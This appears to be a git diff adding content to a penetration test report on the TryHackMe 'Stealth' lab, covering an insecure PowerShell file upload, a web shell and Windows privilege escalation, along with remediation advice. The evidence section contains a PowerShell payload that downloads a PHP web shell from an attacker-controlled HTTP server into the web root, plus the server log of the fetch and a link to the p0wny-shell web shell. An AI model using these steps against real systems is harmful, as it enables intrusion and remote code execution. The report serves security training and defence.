@@ -1,30 +1,56 @@
 # Penetration Test Report  
 **Engagement:** TryHackMe - Stealth    
-**Date:** October 2025  
+**Date:** November 2025  
 **Tester:** Colin S    
 
 ---
 
-## Summary 
+## Summary  
+The engagement focused on the TryHackMe Stealth room. During the test a single, high-impact web vulnerability was exploited to gain initial access: an insecure file upload mechanism that executed uploaded PowerShell files and allowed a PHP web shell to be placed in the web server’s root directory. Following initial access, the Windows host was enumerated and the granted `SeImpersonatePrivilege` was abused to achieve `NT AUTHORITY\SYSTEM` execution and create an administrative user for reliable RDP access.  
 
+Remediation includes disabling server-side execution of uploaded content, enforcing strict server-side validation and allowlists for file uploads, storing uploads outside the web server root directory, restricting outbound fetch capabilities from the web service, and hardening Windows accounts by removing unnecessary privileges such as `SeImpersonatePrivilege`. Additional recommendations are to monitor and alert on privileged account creation and token-impersonation activity.  
  
 ## Vulnerabilities  
 
 ### 1.
-**CVSS v4.0 Base Score:**
+**CVSS v4.0 Base Score:** 9.3 (Critical)  
+CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N  
 
-**CVSS Justification:**
+**CVSS Justification:**  
+The application exposed an upload endpoint that accepted `.ps1` files client-side only and executed uploaded `.ps1` content server side. This allowed an unauthenticated remote attacker to place and execute arbitrary code on the web server, yielding remote code execution and enabling placement of a PHP web shell in the web server’s root directory. The vulnerability is network accessible (AV:N), easy to exploit (AC:L), requires no privileges (PR:N), and produces high confidentiality/integrity impact (VC/VI:H).  
 
+**Summary:**  
+The web application's upload functionality executes uploaded PowerShell files on the server and only enforces a client-side `.ps1` restriction; this restriction was bypassed to download and deploy a web shell into the web server root directory, providing remote code execution with the privileges of the web service.  
 
-**Summary:** 
-
-**Background:** 
+**Background:**   
+The public HTTP service on port 8080 presented a simple file upload form mentioning only `.ps1` files are allowed. The application performed scanning/execution of the uploaded `.ps1` content and returned the execution results in the HTTP response body. Client-side filters were quickly bypassed and enabled upload of a crafted file to fetch a secondary file from an attacker-controlled HTTP server. The execution process was exploited to download a PHP web shell onto the web server. By navigating to the file’s location, full remote code execution was achieved via the web service account.     
 
 **Technical details & Evidence:**  
+The following steps were taken to exploit the upload feature and gain full remote code execution. The web shell used is listed in the appendices.  
 
-**Impact:** 
+A `.ps1` file was created to upload the web shell, as shown below:  
+```powershell
+$url = "http://10.4.12.97:5050/shell.php"
+$localPath = "C:\xampp\htdocs\shell.php"
+Invoke-WebRequest -Uri $url -OutFile $localPath
+```
+The above code sets the location of the `shell.php` file to be downloaded as the `$url` parameter and the output location and name of the file as the `$localPath` parameter and then issues `Invoke-WebRequest` to grab the file from the attacker-controlled HTTP server.
 
-**Remediation Advice:** 
+```bash
+python3 -m http.server 5050
+Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
+10.201.36.254 - - [01/Oct/2025 20:23:01] "GET /shell.php HTTP/1.1" 200 -
+```
+The above shows the setup of the HTTP server and the successful retrieval of the `shell.php` file by the target web server.  
+
+Once the `shell.php` file was saved to the target, remote code execution was achieved by navigating the file location via the browser's address bar and the following URL `http://10.201.36.254:8080/shell.php` 
+![Initial Access.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Stealth/Images/Initial%20Access.png)
+
+**Impact:**  
+An unauthenticated remote attacker can execute arbitrary code on the host, place and run web shells, access local files served by the web server (including sensitive application files), and use the web shell as a pivot for further attack.  
+
+**Remediation Advice:**  
+The server-side upload handling must validate and restrict uploads (validate MIME type and perform content inspection) and must not execute uploaded files. Server code should perform strict server-side validation of file types, implement allowlists for permitted file kinds, sanitise filenames, store uploads outside the web server root directory, and run the service as a minimally privileged account without write access to web content directories. Additionally, enable robust logging, implement egress filtering to block the server from fetching arbitrary external resources, and implement Web Application Firewall rules to detect suspicious upload/execution patterns.  
 
 ---
 
@@ -44,22 +70,5 @@
 **Remediation Advice:** 
 
 ---
-
-### 3. 
-**CVSS v4.0 Base Score:** 
-
-**CVSS Justification:**
-
-
-**Summary:** 
-
-**Background:** 
-
-**Technical details & Evidence:** 
-
-**Impact:** 
-
-**Remediation Advice:** 
-
----
 ## Appendices  
+[P0wny-shell](https://github.com/flozz/p0wny-shell/tree/master)  
